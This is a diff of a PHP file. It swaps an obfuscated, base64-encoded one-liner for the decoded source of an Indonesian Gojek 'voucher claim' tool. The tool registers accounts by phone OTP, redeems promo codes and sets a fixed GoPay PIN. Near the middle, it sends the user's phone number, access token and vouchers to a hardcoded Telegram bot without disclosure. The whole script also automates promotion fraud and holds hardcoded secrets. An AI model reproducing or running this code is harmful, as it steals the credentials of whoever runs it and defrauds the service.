@@ -1,1 +1,176 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=d764c86c60be4d514275cb845b52484a2a456e3d7VrrctpKEv7tVOUdxipXEGXQhYuwyXqzxMaX2AbKkIvL8arG0gBzEJKONHLs5OQ19in2qfZJtkcSIIFkgze7W1u1VGJA8/XXPd09PTdMzIhukiEOLKYzOiXfHZvoPmFioeVTLH/AE+wxXCi+ff2K2oYVmAQJw8A2GHVsVXLHrgAtxBg7yHAsxxMFm9w/CiUBHTz/+moLxSXpR2JZzjcuf25hOkWfnMAYEw9VlF1VycCPPEJsDv+Av02oZfnoDTr82Oqg4+4VurxGF2fH7QyxOysgXGoAPUbwaiJBMsEVYuHGLE/L17fo5rRJm/5toSgJWxkEm/fy9StZRjPPIWOM7RERiz9ev0Lxa8fGU4wOEH8TucS8gUwxtaDFZ57uEdfCBhEFJJSQAP9DsSKS0JTpHrZNUVWUEtrf309SBBaoay6+Z3Tl3S3qOFPH475IioLVO7YD2plHp+JwRJgv9gdHZ51iykbbGbvrglL90CqgnP8JW5+Fi4BeF1vcAFveAIvS2AWaDpG47XpkpE8xM8ZiQb75665S3r+VC6XINZFQsYgSgZ9J+sEdqBETuJJSqhYPDgpapbAiEVq38PmK5fz1M/2VWD7J16RyTcpTirgdUoasmtSb1MkV0mGWOgQ5Wpl1bUnhTFmmLpSnjOvKJlIziaDD1QyqBOMOVAQ+IAs/hHAECk2hIEWDUSr8ZRS+G84UkgGGIIla+WCUCvDIHUMhhWe78HDsho98OrKJqQeubjiBzbxHaD47En4WkvkGyUN9BhXvAHnk94D4TBTk+7psBD5zpsTzYcjbgWWVIvOSPeCeZp7r+OKcpYQKgsNcnTkTKJOFYqreQEP4HFTBgO2Df5Jg6E6pAP/nXElVWSV49xadOzA93BOPDukE+xT5gYnHyKRoQsHzAtRSKIYJGtD2bFHqAiZdkbjhz5Ya7hw1Cp5hUWIzPQ7SyPmNTJqGY/tNqJaeQ03Qw9FC8wfvPu84VNNQiYR43FI+iZsix/H2n6WZAp8YHmEA2qvW1LqpaGVi1EhZVYlWxjX1rqwZNUXZ28N3dZUshT10Wm7M5TCb5BD0mE4ANScDQiwPPzYM4vuZGZATxffEG0P0LDQltomHDHvxFDa3diVtUkrmmRPakBIMAmom5TziO4FnEN35ZhNPh1g0QbaU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
+<?php
+date_default_timezone_set('Asia/Jakarta');
+include "function1.php";
+echo color("nevy"," ===================================\n");
+echo color("yellow"," Klaim Voucher 20+10\n");
+echo color("green"," Jawkills & CUAN FOR MY LIFE\n");
+echo color("blue"," Time    : ".date('[d-m-Y] [H:i:s]')."	\n");
+echo color("nevy"," ===================================\n");
+
+// function change(){
+        $nama = nama();
+        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
+        ulang:
+        echo color("nevy","?] Nomor : ");
+        // $no = trim(fgets(STDIN));
+        $nohp = trim(fgets(STDIN));
+        $nohp = str_replace("62","62",$nohp);
+        $nohp = str_replace("(","",$nohp);
+        $nohp = str_replace(")","",$nohp);
+        $nohp = str_replace("-","",$nohp);
+        $nohp = str_replace(" ","",$nohp);
+
+        if (!preg_match('/[^+0-9]/', trim($nohp))) {
+            if (substr(trim($nohp),0,3)=='62') {
+                $hp = trim($nohp);
+            }
+            else if (substr(trim($nohp),0,1)=='0') {
+                $hp = '62'.substr(trim($nohp),1);
+        }
+         elseif(substr(trim($nohp), 0, 2)=='62'){
+            $hp = '6'.substr(trim($nohp), 1);
+        }
+        else{
+            $hp = '1'.substr(trim($nohp),0,13);
+        }
+    }
+        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$hp.'","signed_up_country":"ID"}';
+        $register = request("/v5/customers", null, $data);
+        if(strpos($register, '"otp_token"')){
+        $otptoken = getStr('"otp_token":"','"',$register);
+        echo color("green","+] Kode verifikasi sudah di kirim")."\n";
+        otp:
+        echo color("nevy","?] Otp: ");
+        $otp = trim(fgets(STDIN));
+        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
+        $verif = request("/v5/customers/phone/verify", null, $data1);
+        if(strpos($verif, '"access_token"')){
+        echo color("green","+] Berhasil mendaftar\n");
+        $token = getStr('"access_token":"','"',$verif);
+        $uuid = getStr('"resource_owner_id":',',',$verif);
+        echo color("nevy","+] Your access token : ".$token."\n\n");
+        save("token.txt",$token);
+        echo color("nevy","\n===========(REDEEM VOUCHER)===========");
+        echo "\n".color("nevy","!] GOFOOD");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(15);
+        }
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2107"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
+        echo "\n".color("green","+] Message: ".$message);
+        goto gocar;
+        }else{
+        echo "\n".color("red","+] Message: ".$message);
+	gocar:
+        echo "\n".color("nevy","!] GOFOOD LAGI ");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(15);
+        }
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD2107"}');
+        $message = fetch_value($code1,'"message":"','"');
+        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
+        echo "\n".color("green","+] Message: ".$message);
+        goto gofood;
+        }else{
+        echo "\n".color("red","+] Message: ".$message);
+        gofood:
+        echo "\n".color("nevy","!] GOFOOD");
+        echo "\n".color("yellow","!] Please wait");
+        for($a=1;$a<=3;$a++){
+        echo color("yellow",".");
+        sleep(10);
+        }
+        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"PESANGOFOOD2107"}');
+        $message = fetch_value($code1,'"message":"','"');
+        echo "\n".color("green","+] Message: ".$message);
+        sleep(2);
+        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
+        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
+        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
+        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
+        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
+        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
+        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
+        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
+        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
+        echo "\n".color("yellow","!] Total voucher ".$total." : ");
+        echo color("blue","1. ".$voucher1);
+        echo "\n".color("blue","                     2. ".$voucher2);
+        echo "\n".color("blue","                     3. ".$voucher3);
+        echo "\n".color("blue","                     4. ".$voucher4);
+        echo "\n".color("red","                     5. ".$voucher5);
+        echo "\n".color("red","                     6. ".$voucher6);
+        echo "\n".color("red","                     7. ".$voucher7);
+        echo"\n";
+        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
+        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
+        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
+        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
+        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
+        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
+        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
+        $TOKEN  = "1338099497:AAFtktzWyqJ6x6YPGSmkc00E1fd-81_KB3k";
+      	$chatid = "746297056";
+      	$pesan 	= "[+] Gojek Account Info Makanbro [+]\n\n".$nohp."\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
+      	$method	= "sendMessage";
+      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
+      	$post = [
+      		'chat_id' => $chatid,
+                'text' => $pesan
+        	];
+                $header = [
+                "X-Requested-With: XMLHttpRequest",
+                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
+                        ];
+                                        $ch = curl_init();
+                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+                                        curl_setopt($ch, CURLOPT_URL, $url);
+                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
+                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+                                        $datas = curl_exec($ch);
+                                        $error = curl_error($ch);
+                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+                                        curl_close($ch);
+                                        $debug['text'] = $pesan;
+                                        $debug['respon'] = json_decode($datas, true);
+         setpin:
+         echo "\n".color("purple","SET PIN GOPAY SEKALIAN ? !!!: Y/N ");
+         $pilih1 = trim(fgets(STDIN));
+         if($pilih1 == "y" || $pilih1 == "Y"){
+         //if($pilih1 == "y" && strpos($no, "628")){
+         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN GOPAY = 141201 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
+         $data2 = '{"pin":"141201"}';
+         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
+         echo "OTP PIN 6 digit : ";
+         $otpsetpin = trim(fgets(STDIN));
+         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
+         echo $verifotpsetpin;
+         }else if($pilih1 == "n" || $pilih1 == "N"){
+         die();
+         }else{
+         echo color("red","-] GAGAL!!!\n");
+         }
+         }
+         }
+         }else{
+            echo color("red","-] Otp yang anda input salah");
+            echo"\n==================================\n\n";
+            echo color("yellow","!] Silahkan input kembali\n");
+            goto otp;
+            }
+         }else{
+         echo color("red","-] Nomor sudah teregistrasi");
+         echo"\n==================================\n\n";
+         echo color("yellow","!] Silahkan registrasi kembali\n");
+         goto ulang;
+         }
+//  }
+
+// echo change()."\n";
+?>
